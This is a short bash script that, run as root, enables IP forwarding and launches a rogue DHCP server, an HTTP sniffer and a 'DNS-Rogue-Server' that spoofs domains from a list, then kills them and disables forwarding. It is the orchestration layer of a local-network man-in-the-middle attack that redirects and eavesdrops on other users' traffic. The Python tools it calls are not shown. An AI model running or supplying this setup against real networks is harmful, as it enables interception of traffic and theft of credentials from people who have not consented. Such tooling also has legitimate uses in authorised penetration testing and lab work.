#!/bin/bash

if [[ $EUID -ne 0 ]]
then
    echo -e "${RED}RUN AS SUDO"
    exit
fi

echo "1" > /proc/sys/net/ipv4/ip_forward

{ DHCP-Server/dhcpserver.py -m 255.255.255.0 & Simply-HTTP-sniffer/sniffer.py & DNS-Rogue-Server/dnsserver.py -l DNS-Rogue-Server/domains.txt ; }

pkill dnsserver
pkill dhcpserver
pkill sniffer

echo "0" > /proc/sys/net/ipv4/ip_forward
